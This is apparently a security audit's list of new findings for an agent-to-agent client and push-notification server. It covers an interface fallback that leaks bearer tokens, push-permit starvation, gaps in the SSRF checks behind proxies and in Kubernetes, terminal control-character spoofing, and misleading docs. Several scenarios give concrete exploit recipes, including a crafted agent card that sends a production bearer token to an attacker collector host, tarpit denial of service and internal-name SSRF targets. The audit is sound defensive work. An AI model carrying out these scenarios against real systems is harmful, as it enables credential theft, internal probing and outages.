new_findings.finding: The SEC-09 fix checks only the card's first (chosen) interface, but ClientBuilder::build() falls back to the card's later interfaces when the first cannot be built (unknown binding, malformed URL). The fallback moves the endpoint to another host and the --header interceptor goes with it.
new_findings.scenario: a2a --header 'Authorization=Bearer $PROD' send https://partner.example hi; partner's card (hostile, or fetched over http:// and altered) lists {protocolBinding:'NOPE', url:https://partner.example/} then {JSONRPC, url:https://collector.attacker.example/}. The host check passes, build() fails the first, falls back, and every call carries the bearer to the attacker.

new_findings.finding: The overall push gate (512) has no fairness between callers or tenants, and a delivery's wait for a permit counts against push_delivery_timeout. One caller can hold all 512 permits with slow destinations (64 per host:port, so 8 ports on one tarpit host suffice), and every other tenant's webhook deliveries queue behind them and end as 'timeout' without being attempted.
new_findings.scenario: Anonymous (or any authenticated) caller: 6 tasks x 100 push configs to http(s)://tarpit.example:1..8/ that accept TCP and never answer, one SendMessage per task every ~30 s. Legitimate webhooks in the same process stop being delivered. Before ee0a4c4 the same load opened 600 sockets instead (fd pressure), so this is a residual, not a regression.

new_findings.finding: Since c4404e8 push delivery honours HTTPS_PROXY, but the SSRF pre-flight still resolves the webhook host with the local resolver (tokio::net::lookup_host) and refuses delivery if that fails. In a proxy-only egress deployment whose DNS resolves only internal names, every webhook to a public host fails with 'hostname could not be resolved'; the only switch that delivers is allow_private_urls(), which turns all SSRF checks off. Conversely, where local DNS does resolve, the proxy resolves again for https (SEC-13). The proxy test passes only because it uses allow_private_urls().
new_findings.scenario: Kubernetes or corporate network with HTTPS_PROXY=http://egress:3128 and cluster DNS that does not forward external names: N-B-1 (webhooks not delivered behind a proxy) remains true for every SSRF-checked webhook.

new_findings.finding: The deny-list approach cannot see an operator's own address plan. Multi-label names resolved through Kubernetes search domains (ndots:5: kubernetes.default, redis.prod, svc.ns.svc) pass the static check; HttpPushSender's resolve then catches them only if the cluster uses RFC 1918/CGNAT ranges. A cluster whose Service or Pod range is privately used public space (I recall GKE Autopilot defaulting Services to 34.118.224.0/20 - from memory, not verified here) passes both checks, and refuse_private_file_urls, which is static only, passes such names everywhere.
new_findings.scenario: Agent in such a cluster with push enabled: a caller registers http://internal-admin.default/ (or http://kubernetes.default/) and receives task events' side effects there; HttpPushSender's delivery-time check sees a public address and delivers.

new_findings.finding: N-SEC-4's escaping uses char::is_control (Unicode Cc). Bidi controls (U+202A-202E, U+2066-2069) pass on stderr, and stdout's 'already escaped by serde_json' holds only for C0: serde_json does not escape DEL or C1 (U+0080-U+009F, including CSI U+009B). An agent's text can still reorder what the terminal shows, and on a terminal that honours UTF-8-encoded C1 controls, drive it.
new_findings.scenario: A hostile agent returns an artifact or error containing U+202E or U+009B; the operator's terminal shows a spoofed line. Terminal-dependent; not run.

new_findings.finding: Documentation that contradicts the fixes: the BearerTokenTenantResolver::with_mapper example returns format!("tenant-for-{token}"), i.e. the raw credential in the tenant, which SEC-11 just removed from the default; CHANGELOG says the card verify half of SEC-09 has no test, but tools/a2a-cli/tests/e2e/card_origin.rs has five; the mcp-bridge README's first example uses plaintext http://agent.internal:8080.
new_findings.scenario: A reader copies the mapper example and stores bearer tokens in task rows, telemetry and the audit chain again.
